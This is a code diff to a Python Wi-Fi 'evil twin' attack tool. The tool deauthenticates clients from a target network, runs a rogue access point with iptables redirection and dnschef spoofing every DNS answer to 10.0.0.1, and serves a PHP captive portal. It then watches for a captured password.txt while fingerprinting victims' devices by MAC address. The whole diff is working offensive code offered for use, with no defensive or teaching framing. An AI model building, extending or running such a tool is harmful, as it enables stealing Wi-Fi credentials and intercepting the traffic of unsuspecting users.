@@ -50,6 +50,7 @@ class AttackConfig:
     ap_interface: str = ""
     ap_base: str = ""
     internet_interface: str = ""
+    routing_table: str = ""
     
     deauth_pid: Optional[int] = None
     airodump_pid: Optional[int] = None
@@ -93,7 +94,7 @@ class EvilTwinAttack:
         
         tmp_dir = Path('/tmp')
         patterns = ['client_check*', 'scan*', 'handshake_check*', 'airodump.log', 'deauth.log', 
-                   'hostapd.log', 'dnsmasq.log']
+                   'hostapd.log', 'dnsmasq.log', 'dnschef.log']
         for pattern in patterns:
             for f in tmp_dir.glob(pattern):
                 try:
@@ -311,6 +312,7 @@ class EvilTwinAttack:
         
         ret, stdout, _ = self.run_command("ip route get 8.8.8.8 2>/dev/null | grep -oP 'table \\K\\d+'")
         table = stdout.strip() if stdout.strip() else "main"
+        self.config.routing_table = table  # Store for cleanup
         
         log_debug(f"Routing table: {table}")
         
@@ -328,6 +330,9 @@ class EvilTwinAttack:
             self.run_command(f"ip addr flush {self.config.ap_interface}")
             self.run_command(f"ip link set up dev {self.config.ap_interface}")
             time.sleep(2)
+            
+            self.run_command(f"iw dev {self.config.ap_interface} set power_save off")
+            
         else:
             log_info(f"Using existing interface {self.config.ap_interface} directly for AP")
             self.run_command(f"ip link set {self.config.ap_interface} down")
@@ -338,12 +343,29 @@ class EvilTwinAttack:
         log_info("Adding iptables for internet sharing...")
         self.run_command("iptables --flush")
         self.run_command(f"ifconfig {self.config.ap_interface} up 10.0.0.1 netmask 255.255.255.0")
+        
+        # NAT rules
         self.run_command(f"iptables -t nat -A PREROUTING -i {self.config.ap_interface} -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
         self.run_command(f"iptables --table nat --append POSTROUTING --out-interface {self.config.internet_interface} -j MASQUERADE")
-        self.run_command(f"iptables --append FORWARD --in-interface {self.config.ap_interface} -j ACCEPT")
         
+        # FORWARD rules (like WiFi Pumpkin)
+        self.run_command("iptables -P FORWARD DROP")
+        self.run_command(f"iptables -A FORWARD -i {self.config.internet_interface} -o {self.config.ap_interface} -m state --state RELATED,ESTABLISHED -j ACCEPT")
+        self.run_command(f"iptables -A FORWARD -i {self.config.ap_interface} -o {self.config.internet_interface} -j ACCEPT")
+        self.run_command(f"iptables -A FORWARD -i {self.config.ap_interface} -p tcp --dport 53 -j ACCEPT")
+        self.run_command(f"iptables -A FORWARD -d 10.0.0.1 -i {self.config.ap_interface} -p tcp --dport 80 -j ACCEPT")
+        self.run_command(f"iptables -A FORWARD -i {self.config.ap_interface} -j DROP")
+        
+        # IP forwarding
         with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
             f.write("1")
+        
+        # IP rules
+        self.run_command("ip rule add from all lookup main pref 1 2>/dev/null")
+        self.run_command(f"ip rule add from all iif lo oif {self.config.ap_interface} uidrange 0-0 lookup 97 pref 11000 2>/dev/null")
+        self.run_command(f"ip rule add from all iif lo oif {self.config.internet_interface} lookup {table} pref 17000 2>/dev/null")
+        self.run_command(f"ip rule add from all iif lo oif {self.config.ap_interface} lookup 97 pref 17000 2>/dev/null")
+        self.run_command(f"ip rule add from all iif {self.config.ap_interface} lookup {table} pref 21000 2>/dev/null")
         
         log_info("Starting services...")
         
@@ -365,8 +387,9 @@ class EvilTwinAttack:
         )
         time.sleep(3)
         
+        # Replace dnsspoof with dnschef
         subprocess.Popen(
-            f"dnsspoof -i {self.config.ap_interface} > /dev/null 2>&1",
+            f"dnschef --interface 10.0.0.1 --fakeip=10.0.0.1 --logfile=/tmp/dnschef.log > /dev/null 2>&1",
             shell=True,
             stdin=subprocess.DEVNULL,
             stdout=subprocess.DEVNULL,
@@ -418,7 +441,7 @@ class EvilTwinAttack:
         time.sleep(3)
         
         subprocess.Popen(
-            "cd portal && php -S 10.0.0.1:80 router.php > /dev/null 2>&1",
+            "cd /eviltwin/portal && php -S 0.0.0.0:80 router.php > /dev/null 2>&1",
             shell=True,
             stdin=subprocess.DEVNULL,
             stdout=subprocess.DEVNULL,
@@ -448,6 +471,7 @@ class EvilTwinAttack:
         connection_cache = set()
         hostapd_pos = 0
         dnsmasq_pos = 0
+        dnschef_pos = 0
         
         while self.running:
             if Path("password.txt").exists():
@@ -503,12 +527,27 @@ class EvilTwinAttack:
                                 log_info(f"Device disconnected: {mac}")
                     hostapd_pos = f.tell()
             
+            # DHCP detection from dnsmasq.log
             if Path("/tmp/dnsmasq.log").exists():
                 with open("/tmp/dnsmasq.log", 'r') as f:
                     f.seek(dnsmasq_pos)
                     for line in f:
-                        if "query" in line and ("captive.apple.com" in line or "msftconnecttest.com" in line):
-                            ip_match = re.search(r'from ([0-9.]+)', line)
+                        if "DHCPACK" in line:
+                            ip_match = re.search(r'DHCPACK\(.*?\) (\d+\.\d+\.\d+\.\d+)', line)
+                            mac_match = re.search(r'([0-9a-f]{2}:){5}[0-9a-f]{2}', line)
+                            if ip_match and mac_match:
+                                ip = ip_match.group(1)
+                                mac = mac_match.group()
+                                print(f"[DHCP] IP {ip} assigned to {mac}")
+                    dnsmasq_pos = f.tell()
+            
+            # Device type detection from dnschef.log
+            if Path("/tmp/dnschef.log").exists():
+                with open("/tmp/dnschef.log", 'r') as f:
+                    f.seek(dnschef_pos)
+                    for line in f:
+                        if "cooking the response" in line or "proxying" in line:
+                            ip_match = re.search(r'\[\*\] (\d+\.\d+\.\d+\.\d+):', line)
                             if ip_match:
                                 ip = ip_match.group(1)
                                 ret, stdout, _ = self.run_command(f"arp -n | grep '^{ip} ' | awk '{{print $3}}'")
@@ -520,7 +559,10 @@ class EvilTwinAttack:
                                     elif "msftconnecttest.com" in line:
                                         print(f"[DNS] Windows device detected: {mac}")
                                         log_info(f"Windows device detected: {mac}")
-                    dnsmasq_pos = f.tell()
+                                    elif "connectivitycheck.gstatic.com" in line:
+                                        print(f"[DNS] Android device detected: {mac}")
+                                        log_info(f"Android device detected: {mac}")
+                    dnschef_pos = f.tell()
             
             time.sleep(3)
         
@@ -532,7 +574,7 @@ class EvilTwinAttack:
         if self.config.client_check_process:
             self.config.client_check_process.terminate()
         
-        for proc in ['hostapd', 'dnsmasq', 'airodump-ng', 'aireplay-ng', 'dnsspoof', 'passapi.py', 'php']:
+        for proc in ['hostapd', 'dnsmasq', 'airodump-ng', 'aireplay-ng', 'dnschef', 'passapi.py', 'php']:
             self.run_command(f"pkill -f {proc} 2>/dev/null")
         
         if self.config.deauth_pid:
@@ -544,7 +586,14 @@ class EvilTwinAttack:
             log_info(f"Removing virtual AP interface {self.config.ap_interface}...")
             self.run_command(f"iw dev {self.config.ap_interface} del 2>/dev/null")
         
-        # Restore iptables from /sdcard/iptables-default (no save, no flush, no ip forward disable)
+        # Clean up ip rules
+        self.run_command("ip rule del from all lookup main pref 1 2>/dev/null")
+        self.run_command(f"ip rule del from all iif lo oif {self.config.ap_interface} uidrange 0-0 lookup 97 pref 11000 2>/dev/null")
+        self.run_command(f"ip rule del from all iif lo oif {self.config.internet_interface} lookup {self.config.routing_table} pref 17000 2>/dev/null")
+        self.run_command(f"ip rule del from all iif lo oif {self.config.ap_interface} lookup 97 pref 17000 2>/dev/null")
+        self.run_command(f"ip rule del from all iif {self.config.ap_interface} lookup {self.config.routing_table} pref 21000 2>/dev/null")
+        
+        # Restore iptables from /sdcard/iptables-default
         self.restore_iptables()
         
         log_info("Monitor mode interface left active. Use 'iw dev' to reset if needed.")
@@ -571,7 +620,9 @@ class EvilTwinAttack:
             log_debug(f"PID written to /sdcard/evil_twin.pid: {os.getpid()}")
         except Exception as e:
             log_warn(f"Failed to write PID file: {e}")
-        
+            
+        self.restore_iptables()
+        log_info("Cleaned up iptables rules")
         self.config.mon_interface = args.interface
         self.config.target_bssid = args.bssid
         self.config.target_channel = args.channel
